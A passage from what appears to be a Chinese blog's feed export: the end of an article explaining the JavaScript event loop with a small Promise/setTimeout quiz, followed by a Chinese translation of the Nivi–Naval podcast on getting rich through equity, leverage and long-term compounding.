事件触发线程：如点击等事件存在绑定回调时，触发后会被放入宏任务事件队列。 定时触发器线程：setTimeout和setInterval的定时计数器，在时间到达后放入宏任务事件队列。 异步HTTP请求线程：XMLHTTPRequest请求后新开一个线程，等待状态改变后，如果存在回调函数，就将其放入宏任务队列。 需要注意的是，GUI渲染进程和JS引擎进程互斥，两者只会同时执行一个。主要的原因是为了节流，因为JS的执行会可能多次改变页面，页面的改变也会多次调用JS，如resize。因此浏览器采用的策略是交替执行，每个宏任务执行完成后，执行GUI渲染，然后执行下一个宏任务。 Webworker线程因为JS只有一个引擎线程，同时和GUI渲染线程互斥，因此在繁重任务执行时会导致页面卡住，所以在HTML5中支持了Webworker，它用于向浏览器申请一个新的子线程执行任务，并通过postMessage API来和worker线程通信。所以我们在繁重任务执行时，可以选择新开一个Worker线程来执行，并在执行结束后通信给主线程，这样不会影响页面的正常渲染和使用。 总结 JS是单线程、阻塞式执行语言。 JS通过事件循环机制来完成异步任务并发执行。 JS将任务细分为宏任务和微任务来提供执行优先级。 浏览器单页面为一个进程，包含的JS引擎线程和GUI渲染线程互斥，可以通过新开Web Worker线程来完成繁重的计算任务。 最后给大家出一个考题，可以猜下执行的输出结果来验证学习成果： 1234567891011121314151617181920function sleep(ms) &#123; console.log('before first microtask init'); new Promise(resolve =&gt; &#123; console.log('first microtask'); resolve() &#125;) .then(() =&gt; &#123;console.log('finish first microtask')&#125;); console.log('after first microtask init'); return new Promise(resolve =&gt; &#123; console.log('second microtask'); setTimeout(resolve, ms); &#125;);&#125;setTimeout(async () =&gt; &#123; console.log('start task'); await sleep(3000); console.log('end task');&#125;, 0);setTimeout(() =&gt; console.log('add event'), 0);console.log('main thread'); 输出为： 123456789main threadstart taskbefore first microtask initfirst microtaskafter first microtask initsecond microtaskfinish first microtaskadd eventend task 参考资料 这一次，彻底弄懂 JavaScript 执行机制 并发模型与事件循环 JavaScript 定时器与执行机制解析 timers-and-user-prompts Web API 接口参考- window.setTimeout Generator 函数的异步应用 从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理 .post-body .fancybox img{margin: 0 auto !important; }]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[如何不靠运气变得富有]]></title>
    <url>%2Farticles%2F%E5%A6%82%E4%BD%95%E4%B8%8D%E9%9D%A0%E8%BF%90%E6%B0%94%E5%8F%98%E5%BE%97%E5%AF%8C%E6%9C%89%2F</url>
    <content type="text"><![CDATA[第一条：追求财富，而不是金钱或地位Nivi：你可能听说过Naval在推特上进行的那一波主题为“如何在不只依靠运气的情况下致富”的推特风暴（tweetstorm）。我们借助这个播客回顾大部分的推文，给Naval一个机会详细聊聊这些话题。他可能会提出一些以前没有发表过的想法。 Naval是AngelList创始人和Epinions的联合创始人。他是一位眼光独到的科技投资人，投出了像Twitter、Uber这样的科技公司。 不只是科技行业的人，各行各业的人都想知道如何解决他们「钱的问题」。每个人都隐约地意识到自己想要变得富有，但是他们没有一套好的原则来遵守和践行。 财富是你睡觉时还能产生收入的资产Nivi：财富、金钱和地位有什么区别? Naval：财富是你渴望的东西，是你睡觉时还在产生收入的财产。举例来说，财富是在夜间还能运行的为其他客户服务的计算机程序。财富是你存在银行里的钱，用于再投资其他资产和业务。 房子是财富的一种形式，因为你可以把它租出去，收得租金，尽管这是一种比经营商业企业更低效的土地使用方式。 我对财富的定义是指那些可以在你睡觉时依然可以为你赚钱的企业和资产。 财富的终极目标是自由你渴望财富，是因为它能给你带来自由。也就是说，你不必像白领那样一丝不苟的系领带；你不必早上6点就起床、996挤地铁上下班；你不必把时间浪费在一份没有灵魂，你不喜欢的工作上。 我们创造财富就是为了自由，仅此而已。而不是去买毛皮大衣，不是去开法拉利，不是去驾驶游艇，也不是去乘坐湾流飞机环游世界。那些东西很快就会变得无聊和愚蠢。它（财富）是关于你如何成为你自己的事。 除非你真的想要财富，否则你不会得到它。全世界都想要它，全世界都在为此努力。在某种程度上，它是有竞争力的。这是一个正和博弈，但其中也有竞争因素，因为现在社会上的资源是有限的。为了获得资源去做你想做的，你必须脱颖而出。 金钱是我们转移财富的方式金钱是社会信用，它是一种从别人的时间中获得信用和债务的能力。如果我做对了工作，为社会创造了价值，社会会说：“哦，谢谢你。我们欠你一些东西，将来会补偿你。这是我的借条，我们把它叫做钱吧。” 钱会贬值是因为, 人们偷了借据 政府增发货币 人们违背IOU 但是金钱试图成为社会的一个可靠的欠条，因为你在为自己的付出而被他人亏欠。我们把这些欠条到处传递，金钱是我们转移财富的方式。 地位是你在社会等级中的地位人生基本上有两大游戏。一个是金钱游戏。钱并不能解决你所有的问题，但它会解决你所有的和钱相关的问题。我想大家都能意识到这一点，所以才想赚钱。同时，在内心深处，许多人认为他们做不到，所以他们不希望任何财富创造发生。他们攻击那些赚钱的企业和企业家们，说他们：“赚钱是罪恶的。你不应该这么做。”但他们实际上在玩另一个游戏，那就是地位游戏。他们试图传递一种信息“我不需要钱，我们不要钱。” 地位指的是你在社会等级中的地位。 财富不是零和游戏。世界上每个人都可以拥有一所房子，你有房子并不会影响我有房子的能力。如果有什么区别的话，建造的房屋越多，建造房屋就越容易，我们对建造房屋的了解就越多，就会有更多的人拥有房屋。 财富是一个正和游戏。我们一起创造，努力创造着寄托着我们美好期待的“艺术品”来解释我们正在做的事情。最终，一些全新的东西将被创造出来。这是一个正和游戏。 另一方面，地位是一个零和游戏。这是一个非常古老的游戏。我们从原始人部落开始就玩这个游戏了。也就是等级制度。老大是谁？老二是谁？老三是谁？老三打败了老二，老二就必须让位。所以，地位是一个零和游戏。 第二条：为世界创造更多财富不是从别人那里拿走什么，而是为这个世界创造更多 财富创造带来了世界的丰富Naval：有一种观点认为赚钱是邪恶的，这个说法好像起源于“金钱是万恶之源”。人们认为银行家偷走了我们的钱，这在某种程度上是正确的，在世界上的很多地方，有很多偷窃行为一直在发生。 从某种意义上说，世界的历史就是创造者和索取者之间的捕食者/被捕食者关系。有些人走出去创造东西，建造东西，努力创造机会。有些人带着剑、枪，或者经济上我们说税收、裙带资本主义，共产主义等等形式，进行着不同形式的偷窃。即使在自然界，寄生生物也比非寄生生物多。你身上有很多寄生虫，它们靠你生存。好的情况是共生，他们会回馈一些东西。但也有很多只是索取。这就是任何复杂系统的本质。 我关注的是真正的财富创造。这不是仅为了赚钱，不是单纯从别人那里拿东西。 显而易见的是，工作不是有限的，财富也不是有限的。否则，我们还会坐在洞穴里，琢磨着如何瓜分柴火，或者偶尔运气好时捕食到的一些死鹿。 人类文明中的大部分财富，事实上是全部财富，都是被创造出来的。它是从某处产生的。它是由人创造，由科技创造，由生产力创造的。它是通过努力创造出来的。这种被窃取的想法是一种可怕的零和游戏，人们试图获得地位的游戏。 每个人都可以变得富有但现实是，每个人都可以变得富有。我们可以看到，在第一世界国家，基本上每个人都比200年前活着的人富有。200年前，没有人使用抗生素，没有人有汽车，没有人能用电，没有人有iPhone。所有这些都是使我们作为一个物种变得更富有的发明。今天，我宁愿在第一世界国家做一个穷人，也不愿在路易十四的法国做一个富人。这是因为财富的创造。 技术的引擎是科学，其目的是创造丰富性。所以，我认为从根本上来说，每个人都可以变得富有。 我想让你们想象这样一种情形。如果每个人都掌握一个好的软件工程师和一个好的硬件工程师的技能，你可以自己造机器人，开发程序，自己建桥，并为它们编程。假设每个人都知道怎么做。 那你认为20年后的社会会是什么样子？我的猜测是，我们会造出各种各样的机器人、机器、软件和硬件来做任何事情。我们都会生活得非常富足。我们基本上就退休了，因为我们都不用为任何基本的东西工作。我们甚至会有机器人护士，会有机器驱动的医院，会有自动驾驶汽车。我们会有100%自动化的农场，会有清洁能源。那时，我们可以利用技术上的突破来得到我们想要的一切。如果有人还在工作，那么他们是在用工作来表达他们的创造力。 我不认为资本主义是邪恶的。资本主义实际上是好的，它只是被劫持了，被不当的外部成本定价所劫持。它被不正当的收益所劫持，在那里有腐败，或者有垄断。 第三条：自由市场是人类固有我们是唯一跨越基因界限进行合作的动物，因为我们可以在自愿的交换中追踪信用（credit）和债务（debt） 自由市场是人类社会固有的Naval：全面的资本主义(意味着自由市场)是人类社会固有的。资本主义不是我们发明的，甚至不是我们发现的东西。它天然存在于我们的每一次交换中。当你和我交换信息时，你一定想从我这里得到一些信息。如果我们没有良好的信息交流，你会去找别人。所以，交换就是在记录信用和债务，这是我们作为灵活的社会动物与生俱来的本领。 我们是动物王国中唯一跨越种群进行合作（协作）的动物。大多数动物只会成群合作，共同进化，它们血液相连，所以它们有一些共同的兴趣。人类没有这种成群合作的能力，也不需要这么麻烦。就算你是塞尔维亚人，他是波斯人，我是印度人，没有任何血缘关系，但我们仍然可以合作。 什么让我们合作？因为我们可以记录借方和贷方。谁投入了多少工作？谁贡献了多少？这就是自由市场资本主义。因此，我坚信这是人类与生俱来的，我们将为每个人创造越来越多的财富。 每个人都可以变得富有，每个人都可以退休，每个人都可以成功。这只是一个教育和欲望的问题。前提是你必须想要它。如果你不想要，没关系，没人强迫你参与游戏。但是不要试图贬低那些积极参与游戏的人。他们没准儿就是那些能让你晚上睡在温暖舒适的床上，让你能更方便的买到全世界的东西，让你能拿着嗡嗡作响的iPhone开心刷抖音的人。因此，这是一场美妙的比赛，值得我们从伦理上、理性上、道德上去挑战一次。它将继续使我们所有人越来越富有，直到我们为任何想要的人创造大量财富。 太多的索取者而没有足够的创造者将使一个社会陷入毁灭Nivi：不只是个人在暗地里鄙视财富，对吧？有些国家、团体和政党公然蔑视财富。至少看起来是这样。 Naval：没错。这些国家、政党和团体正在沦为一场零和博弈。在摧毁财富创造的过程中，他们把每个人都拉低到和他们一样的水平。 这就是为什么美国是一个非常受移民欢迎的国家，因为美国梦。显然，不同的人对财富的定义是不同的。第一世界公民对财富的定义可能是，“我一定要赚到数百万美元。而对于第三世界的贫穷移民来说，当刚进入这个国家的时候，我们只是贫穷的移民，对财富的预期值会更低。它可能只是，“我不需要在我的余生做我不想做的体力劳动。” 但是鄙视它的群体会把整个群体带到和他们一样的水平。如果有太多的索取者，而没有足够的创造者，社会就会分崩离析。你最终会变成一个共产主义国家。看看委内瑞拉就知道，他们不停的忙于获取、分割和重新分配，人们在街上挨饿，每年都因为饥饿而失去几公斤的体重。 另一种思考方式是想象一个有太多寄生虫的有机体。你需要少量的寄生虫来保持健康。你需要很多的共生体。所有细胞中帮助我们呼吸和燃烧氧气的线粒体。这些是帮助我们生存的共生体。没有他们我们无法生存。 但是，对我来说，他们（共生体）是一起创造财富的伙伴，共同创造了人类的身体。但是如果你体内充满了寄生虫，如果你感染了蠕虫，或者病毒，或者细菌，而这些都是单纯的寄生，你就会死亡。所以，任何生物都只能抵抗少量的寄生虫。当寄生元素失去控制时，你就死定了。 我说的还是道德财富创造，不是垄断，也不是裙带资本主义。我说的是自由思想，自由市场。人与人之间的小规模交流是自愿的，不会对他人产生太大的影响。我认为这种财富创造，如果一个社会不尊重它，如果一个群体不尊重它，那么这个社会就会陷入毁灭和黑暗。 第四条：致富与运气无关致富与运气无关，要掌握致富的技能Naval：很明显，我们想要在这一生中不只依靠运气变得富有。很多人认为赚钱是靠运气。它不是，关键是你要成为那种能赚钱的人。比如，假设我输光了所有的财产，你把我随便扔到任何一个说英语的国家的大街上，不出5到10年，我就会再次变得富有（笑）。因为这是一种技能，而且我认为每个人都可以拥有这种技能。在1000个平行宇宙中，你想在其中999个里变得富有。你不想只在靠运气成分的50个里面变得富有对吧？ 我们在这讲的运气有四种。这个分类来于一本书，a16z的马克·安德森(Marc Andreessen)在Pmarca.com这个博客中曾经提到过。 狗屎运 第一种就是狗屎运。你完全无法控制这种走运，俗话说这就是命好。 坚持不懈的实干运 这种幸运来自于坚持、努力、不停的尝试和行动。当你四处奔波创造了各种各样的机会，这期间你输出了很多能量，你做了很多事情，会有大量的能量交换。 你可能会说，人们只有志趣相投才能聚在一起。那我举另外一个例子，Nenad把他做的很棒的动画视频放到了网上，我在Twitter上看到了它们。从这个意义上说，他通过制作视频创造了自己的运气，直到像我这样的人源源不断找到他。 早有预备的运气 第三种方法是你变得非常善于发现运气。如果你在某个领域非常精通，你会注意到在那个领域幸运的事件是如何发生的。当其他人没有注意到它的时候，你会变得对运气敏感，这是通过技能、知识和工作经验的积累达成的。 4.独特的人格给你带来的好运 最后一种运气是最奇怪、最艰难的一种，但这就是我们要讨论的。在这里，你建立了一个独特的人格，一个独特的品牌，一个独特的心态，然后好运会找到你。 例如，假设你是世界上最擅长深海潜水的人。大家都知道，你会进行别人都不敢尝试的深海潜水。然后，有人幸运的在海岸外发现了一艘沉没的宝藏船。他们没办法拿到，只能跑来找你求助。也就是说，他们的运气同时变成了你的运气，你会因此得到非常丰厚的报酬。这是一个比较极端的例子。那个找到宝藏的幸运儿们，走的是狗屎运。但他们不得不来找你帮忙把宝藏拿出来，最终你会得到一部分这里面的财富，这不是运气。也就是说，虽然这个好运的起始不是你，但是你能让那些发现好运的人在关键时刻想起你，很明显你可以在其中起到不可替代的作用。这种情况下你既成就了别人，又分享了他人的好运，这就是你为什么要打造自己独特的个性和品牌。 在1000个平行宇宙中，你想在其中999个里变得富有Nivi：你刚刚提到，在1000个平行宇宙中，你可以在其中的999个变得富有？我想有些人看到后会说：“这听起来不太可能，太夸张了吧。” Naval：不，我不认为这是不可能的。考虑到你的起步条件，我认为你可能得再努力一点。我在印度的时候是个穷孩子，所以如果我能成功，从这个意义上说，任何人都能。很明显，我四肢健全，智力正常，当然我也确实接受了教育。也许有一些前提条件不一样，但如果你在听这个视频或播客，说明你已经掌握了基本的技能，而且有一个功能健全的身体和会思考大脑。 事实上，一路上我其实遇到了很多倒霉事。我赚的第一笔钱，立刻就在股票市场上赔了个精光。我赚的第二笔钱，或者说我应该赚的第二笔钱，基本上都被我的商业伙伴骗走了。这次（成功）已经是第三次了。 即便如此，财富的积累仍处于缓慢而稳定的挣扎之中。我这辈子还没一次性赚过一大笔钱，总是一大堆小事堆积在一起。它更多的是通过持续的构建商业（做创业公司）、寻找投资机会来持续创造财富。这绝对不是一步登天的事。 财富不是一步登天我的个人财富不是在某一年产生的，它是一点点堆积起来的，每一个阶段积累一点。更多的选择，更多的生意，更多的投资，才能撬开更多自己能做的事情。和Nenad的illacertus一样，他在油管上做了一系列视频，没有任何一个视频会在一夜之间让他一夜暴富，这绝对是一个漫长的过程，学习，阅读，创造，这期间会产生复利效应。 我们谈论的是变得富有，这样你就可以退休，你就有更多的自由。退休不是说什么都不做。而是说你不必去任何你不想去的地方，你不必做任何你不想做的事，你想什么时候醒来就什么时候醒来，你想什么时候睡觉就什么时候睡觉，没有老板对你指手画脚。这就是自由。我们谈论的是足够的财富来获得自由。特别是由于互联网的普及，机会到处都是。坦白讲，我有太多的方法来赚钱，我满脑子都是想法，唯一缺的就是时间。创造财富、创造产品、创造企业、创造机会，从社会获得报酬的方式太多了。 第五条：你必须有点异乎寻常，才能独自走在前沿Naval在他的博客中还提到了一些关于第四种运气的有趣例子，但我想让读者了解的一点是，第四种运气其实是来自于你异乎寻常（这里用了eccentric这个词）的行为，所以有时候异乎寻常可能并不是一件坏事。 Naval：没错，因为这个世界非常讲求效率，每个人都在明显的地方挖掘着新奇的、未被发现的东西，这会帮助你建立优势。独自走在前沿可能需要你有点异乎寻常，而且愿意比一般人挖掘得更深，挖掘的更深仅仅因为你感兴趣。 Nivi：对，除了本杰明·迪斯雷利的那句话外，我看过的两句表达这种运气的话，一个是山姆·阿尔特曼（Samuel Altman）说的，“极端的人才能得到极端的结果。”“我认为这句话很好。还有另一个来自斯坦福大学教授杰弗里·普费弗（Jeffrey Pfeffer）的观点，“你不可能既正常又期待异常回报。” Naval：是的。我喜欢的一句与之完全相反的话是，“玩愚蠢的游戏的人赢愚蠢的奖品。”“很多人花很多时间在社交媒体上，比如你试图在Twitter上提高你的社会地位，但你基本上赢得了愚蠢的、价值不大的社交奖项。 Nivi：我想我从这篇博客文章中得到的最后一个观点是，除了狗屎运，你应该去追求这几种运气（尤其是最后一个），这会让你变得越来越幸运。 Naval：是的，起码能回归均值（笑）。所以，你至少要中和运气，这样才能更好的发挥你自己的才能。 第六条：出租时间不会让你变得富有出租时间不会让你变得富有，因为你不能非线性地赚钱Nivi：接下来你会详细介绍如何致富，以及什么不会有助于致富。第一点是：“出租你的时间不会让你变得富有。你必须拥有公司的股权，才能获得财务自由。” Naval：这可能是最重要的一点。人们似乎认为你可以创造财富，通过工作致富。这可能行不通，原因有很多。最根本的原因是，你的投入和产出相关性太强。几乎在任何有薪水的工作中，即使是像律师或医生这样每小时报酬很高的工作，你仍然在投入时间，你的报酬是按每小时或工作量计价。因此，这意味着当你睡觉的时候，在度假的时候，你没有在创造财富；一旦你退休了，你就没有收入了（退休金另当别论）。也就是说，你不可能得到非线性的收入。 如果你看到一些医生非常富有，那是因为他们成立了公司，开了私人诊所。他们通过私人诊所建立了一个品牌，为他们带来持续的口碑和客户。或者他们制造了某种医疗设备或一个程序，且拥有这些东西的知识产权。 因此，本质上你是在为别人工作，而那个人承担了风险和责任，掌握着知识产权，有品牌。所以，他们不会给你足够的工资，他们会付给你最低工资，让你做他们需要的工作。这可能是一个很高的最低限度，但仍然不是你想象的退休后真正的财富。 出租时间赚钱意味着你很容易被替代最后，你甚至没有为社会创造出那么多原创的东西。正如我所说，这场推特风暴应该被称为“如何创造财富”，只不过“如何致富”是一个更吸引人的标题罢了。因为你现在扮演的是固定的角色，而大多数固定角色的任务是可以教会的。如果他们能像在学校那样被教授，那么最终你将会和一个更年轻的、拥有最新知识的人竞争，这个人注定是要取代你的。 更可能的是，你做的工作最终会被机器人或人工智能取代。它甚至不需要一夜之间取代，它可以一次替换一点。所以，基本上在出租时间的模式下（也就是打工），投入和产出是匹配的，但我不认为这是真正创造财富的方式。 你必须拥有股权才能获得财务自由所以每个真正想要致富的人在某种程度上都拥有一个产品，一个企业，或者某种知识产权。它可以是股票或者期权，这也是为什么很多人选择在早期科技公司工作。这是一个很好的开始方式。 但通常真正的财富是通过创办自己的公司，甚至是通过投资来创造的。投资一家公司或者说入股，其实有很多通往财富的路径并不按照小时计数。 追求一份投入与产出“不匹配”的工作为什么你真的需要追求一份投入和产出“不匹配”的工作或者职业，这将会在之后的推特风暴中提到。拥有高创造力和高影响力的企业往往是那些你可以工作一小时的企业，这一小时可能会产生巨大的影响；或者你做了1000个小时的工作，但是没有效果。 我们拿软件行业为例。一方面，一个伟大的工程师可以创造比特币，创造数十亿美元的价值。另一方面，如果一个工程师一直在错误的方向下功夫，或者做得不够好、不够有创意、深思熟虑等等。就算他辛勤工作整整一年，他们发布的每一段代码最终都不会被使用，他都不会有用户。这是一个投入和产出高度分离的行业的例子，它不是以你投入的时间多少来衡量产出的。 再举一个极端的例子，假设你是世界上最好的伐木工人，如果你不用工具，或用最简单的工具（比如一把斧子或者一把锯子）伐木，你也只会比最差的伐木工人强三倍，因为投入和产出是有很强的相关性的，不会有很大的区别。 因此，你要寻找投入和产出高度不相关的职业。这是另一种可以产生杠杆效应的方式。我说的杠杆并不是指华尔街讲的金融杠杆，这个“杠杆”名声不好。我说的杠杆是指工具，人类擅长使用的工具。计算机是软件工程师使用的工具。对于一个伐木工人，如果有推土机、自动机械轴和锯子，他就会使用这些工具，比那些徒手想要把树连根拔起的人更有影响力。 工具和杠杆是造成投入和产出之间不匹配的原因。一个职业的创造力成分越高，它就越有可能有不匹配的投入和产出。因此，我认为，如果你考虑从事投入和产出高度相关的职业，那在这个过程中，你很难给社会创造财富，也很难为自己创造财富。 第七条：我们应该升级自己的自由，而不是生活方式生活水平远低于其收入水平的人们享受着一种自由，这种自由是那些忙于改善生活方式的人们无法理解的 Nivi：除了把时间租出去之外，还有其他无助于致富的事情吗? Naval：有，我之前提到过两条相关的推文。我说的第一个问题是，你的生活方式应该升级，但不应该升级得太快。这句话的大意是说，生活水平远远低于其收入水平的人享受着一种自由，而那些忙于提升生活方式的人根本无法体会这种自由。我认为这是非常重要的，不要总是忙于升级你的生活水平。事实上，如果你能在赚越来越多的钱时，保持稳定的生活水平和期望，就不会有太多烦恼。所以，不要总想着住更大的房子，过更奢侈的生活，以及所有类似的贪心。 世界上最危险的东西是海洛因和月薪假设你现在的工资是每小时1000美元，你肯定不是从20美元每小时的月薪立马涨到1000美元，这一定是个漫长职业生涯的积累过程。这里面一个微妙的问题是，你的生活水平会随着你赚的钱越来越多而升级。你会想当然的认为自己赚了钱，就该马上去提升生活水平，但这会使你深陷在工资奴隶的陷阱里。我忘了是谁，可能是纳西姆·塔勒布说的，“世界上最危险的东西是海洛因和月薪。”没错，因为它们很容易上瘾。你想要变得富有的方式恰恰是你想要变穷，那时你能做（想做）的事情只有工作，工作，再工作。 理想的情况是，你的赚钱路径是离散的这就是科技产业的运作方式。你十年没赚到钱，然后突然在第11年，你会赚得盆满钵盈。顺便说一下，这就是为什么这些所谓的富人的高边际税率是有缺陷的，因为风险最高，最具创造力的职业一定是，前十年都在赔钱。在冒着巨大的风险时，你会不停的流血，流血，再流血。然后在第11年，或第15年，你可能突然赚到一大笔钱。此时山姆大叔（这里指政府）出现了，说：“嘿，你知道吗，你今年赚了很多钱。因此，你是邪恶的，你必须把一切都交给我们。”因此，它只是摧毁了那些创造性的冒险职业。但理想的情况是，你的致富路径是离散的，循序渐进的。这样你不会期待你的生活水平更新的那么快。一旦你致富之后，你还会选择工作，但你只会在你想做的时候做你想做的事，这才是真正的自由。因此，你会做更多创造性的事情，而减少对对钱，对奢侈生活的关注。 第八条：给社会提供它不知道如何获得的东西社会会因为你创造了它想要、却不知道如何大规模获取的东西，而给你丰厚的回报 给社会它需要的，但不知道如何规模化获取的东西Nivi：你不会因为出租时间而发财的。但你说，“你会通过给社会它想要，但不知道如何规模化获取的东西而致富。” Naval：没错。所以本质上，就像我们之前说的，钱是社会给你的欠条，你在过去做了一些好事，社会会为你创造它想要的东西而付钱。但社会还不知道如何创造这些东西，因为如果已经被创造了，他们就不需要你了。几乎所有在你家里、工作场所和街道上的东西曾经都是科技产品。有一段时间石油是一种科技产品，这让洛克菲勒很富有；有段时间汽车是科技产品，这使亨利·福特富有。因此，正如丹尼•希利斯(Danny Hillis)所说，技术只是一套还不太管用的东西。一旦某样东西成功了，它就不再是技术了。所以，社会总是想要新事物。 想清楚你能提供的产品，然后考虑如何扩大规模如果你想要变得富有，弄清楚你可以为社会提供哪些它想要、但还不知道如何获取的东西。并且是你感兴趣、在你的能力范围内能提供的东西。想清楚之后，下一步你要考虑如何规模化。因为如果你只造一个，那是不够的。你必须建造成千上万个，上百万个，甚至数十亿个。最好的情况是，每个人都可以有一个。史蒂夫·乔布斯和他的团队当然知道社会需要智能手机。他们口袋里的电脑拥有所有电话功能的100倍，而且使用方便。所以，他们想出了如何建造它，然后他们想出了如何扩展它。他们想出了如何让每个第一世界国家的公民，最终也让每个第三世界国家的公民，都能拥有一个。正因为如此，他们获得了丰厚的回报，苹果是世界上最有价值的公司。 Nivi：我想说的是，企业家的工作是为大众市场带来高端产品。 Naval：它以高端开始。首先，这是一种创造性的行为，你创造它只是因为你想要它。你想要它，需要它，所以你知道如何建造它。其实一开始你是为自己建造它。然后你要想办法把它带给其他人。然后有一段时间，富人拥有它。比如，富人有私人司机，他们有黑色高档汽车。然后优步（Uber）出现了，它让每个人都有自己的私人司机。现在你甚至可以看到Uber pool正在取代穿梭巴士，因为它更方便。然后scooter共享电动滑板车出现了，市场进一步下沉。所以规模化需要考虑的是，如何把曾经只是富人拥有的东西给到给每个人。 第九条：互联网极大地丰富了职业发展的可能性互联网会给你的小众兴趣找到买单的人 互联网极大扩展了职业发展的可能性Nivi：让我们看看下一条推文，这也是我觉得对于你将从事什么工作或者职业非常隐秘和超级有趣的推文。你说：“互联网极大拓宽了职业发展的可能性，但是大多数人目前并没有察觉到。” Naval：互联网最根本的颠覆性是，它使这个星球上的人们能彼此联系，任何一个人只要你想联系总有方法。不论是给他们发邮件，在Twitter上发送推文，还是在Facebook上发布一点他们能看到的动态，或者建立一个他们能来访问的网站。互联网将每一个人都联系在了一起。因此互联网是一个将各个网络连接起来的工具，这就是它的超能力。因此，工具给你了，你要思考怎么去更好的利用它。你要明白，借助互联网，你就总能为你的产品、你的才能、你的技艺找到观众，不论他们来自哪里。 举个例子，Nenad制作了IIIacertus，试想一下，如果你是在互联网出现之前看到的他的视频，那么他需要怎么做才能让你看到呢？他可能抱着电脑挨家挨户展示给他的邻居们看？或者跑到当地的电影院播放？这都是不可能的，他只有把视频放到互联网上才能达到这个效果。然后在这个世界上又有多少人对它真正的感兴趣呢？或者只是对我们正在讨论的东西感兴趣，真正的吸收？结果会发现只有很少一部分人，所以关键就在能触动这些人。 互联网能让你的小众兴趣找到观众互联网最怪异的一点是，它允许各种小众兴趣存在。这就好像养蛇的人、喜欢坐热气球的人、喜欢一人独叶孤舟航游世界的人，亦或是痴迷于微型烹饪的人。就像整个日本的微型烹饪现象一样（哈哈今天刚刚看了一本日本烹饪书叫鸡蛋料理），或者像有一个节目是关于女人帮人收拾家务的节目，对吧？ 因此，无论你拥有多么小众化的兴趣，互联网都能提供给你一个很好的平台去把它规模化。当然，这也不是说你所做的就是下一个Facebook，或者你能获得数以十亿计的用户，但是，如果你仅仅想找到5万个和你一样满怀热情的人，互联网中就有这样一群观众等待着你。 这个问题的绝妙之处就在于，我们生活的星球上有70亿的人。人类DNA的组合方式达到了难以想像的程度。每个人都是一个完全不同的个体，你不可能遇到另一个一模一样的你。 这不像你可以说，“恩…，Nivi，离开我的生活吧。这样我可以让Naval进入我的生命中，我就可以有和他同样的感受，得到同样的赞许，有同样的想法。”但事实不是这样的，任何人不是别人的替代品，人与人完全不同的。因此，正是因为每个人有不同的技能、兴趣，才可以在自己独特的事物上发挥创造力。 但是（在互联网）之前这些并不重要，在前互联网时代，如果你住在意大利的一个小渔村，你的渔村并不一定需要完全独特的技能，那么你就必须遵从现实，从事仅有的工作。但是今天，你可以变得完全独特和独立。 互联网可以让你低成本的「走出去」，找到属于自己的观众。然后你通过创建业务、创造产品、积累财富，你通过在互联网上展现独特的你让大众获得快乐。你事业的发展空间就会因互联网而扩大，电子竞技玩家，在Fortnite上赚了数百万美元。YouTube广播公司、 博客、播客，让人们能够创建内容和上传视频。我听说乔·罗根（Joe Rogan），他的播客有20亿次下载，这为他每年带来约1亿美元的收入。 再举一个PewDiePie的例子，前几天，我转发了一条有趣的推文。PewDiePie在新闻媒体中简直就是信任的代名词。这个来自瑞典的小孩，他的热门新闻频道的流量是主流有线网络流量的三倍。而且这仅仅是在他的新闻频道上， 还不算他的娱乐频道。 可以说互联网为各种小众兴趣提供了沃土，但前提是你要擅于将其壮大发展起来。当然，好消息就是每个人生而不同，每个人都有自己擅长的东西。所以要真实做自己。 通过做自己来规避无意义的竞争还有一条值得一提的推文，它没有被收录到这个推文风暴中。那条是“通过做自己来规避无意义的竞争”。事实上，当你在与人竞争时，往往是因为你在复制别人，因为你在努力干着同样的事情。但是其实每个人生而不同，不要总是忙着复制别人。 很明显，人类喜欢模仿，René Girard有一套完整的模仿理论很有趣。大家都觉得模仿简单，但其实模仿远比你做自己要难。所以不要纯模仿，不要纯复制，专注于做自己的事情，当你真正在做自己时，你就会发现没有人能和你竞争，就是这么简单。 因此，你对你自己是谁和你喜欢做什么认识的越深入，你就会面临越少的竞争。也就是说，当你意识到真实做自己没人能和你竞争后，你就能够通过真实性逃离竞争陷阱。但是，这在前互联网时代是没用的建议，而后互联网时代你能将这些变成现实。 第十条：寻找财富游戏中的长期战友选择一个你可以和长期伙伴玩长期游戏的行业，所有的回报都来自于多次游戏的复利。 寻找财富游戏中的长期战友Nivi：我们来聊聊应该考虑在哪些行业工作？应该做什么样的工作？最好和什么样的人一起工作？这些话题。你说过，“你应该选择的行业是，在这里你有长期战友和你玩长期的游戏。” Naval：是的，这是解释为什么硅谷会成功，也是对高信任度社会能够成功的深刻理解。事实上，生活中所有的收益都来自于复利。无论是在人际关系中，创造财富中，或是在学习中。因此，复利是一种神奇的力量，如果你以1倍的价格开始，然后如果每年增长20%，并且持续30年，你得到的不只是额外的30年乘以20%。它有复利效应，所以它会增长，增长，增长，最后你得到的回报将会不可思议。不管是善意、爱情、人际关系还是金钱。所以，我认为复利是一种非常重要的力量。 为什么致富是一场持久战？长期博弈不仅对复利有利，对信任也有利。如果你看一下囚徒困境类型的游戏，囚徒困境的一个解决方案是以牙还牙，也就是我将对你做你上次对我做过的事，如果你犯了错，我会原谅你。但这只适用于重复的囚徒困境的环境中，换句话说，如果我们重复玩一个游戏多次。 因此，如果你处在这样一种情况下，比如你在硅谷，人们在那里互相做生意。他们彼此了解，相互信任，互相帮助，因为他们知道这个人会在下一场比赛的回合中出现，你迟早会遇到这些人。 当然，这并不总是奏效。也有情况是，有的人在硅谷一举成名，赚到很多钱，但人们会背叛彼此，因为他们只是想，“我要靠这个发财，我不在乎。”所以，所有这些情况都有例外。 但本质上，如果你想成功，你必须与他人合作。你必须知道谁可以信任，谁可以长期信任，和你一起在游戏中走下去。所以「复利效应」和「高度信任的圈子」就是你在游戏中生存的武器，同时也是在游戏的周期结束时，让你获利的主要原因。例如，沃伦巴菲特作为美国股票市场的投资者做得非常好，但他能做到这一点的重要原因是因为美国股市一直保持稳定，并且没有碰到美国政府政局非常差的时期，或者是战争时期。总之底层基础设施没有被破坏。因此，对于他来说，他正在玩一场长期比赛。这种信任来自于美国股市的稳定。 当你转行时，你是在从零开始在硅谷，信任来自于小范围内的人际网络，随着时间的推移，你会发现哪些人是你可以合作的，哪些人是你不能合作的。 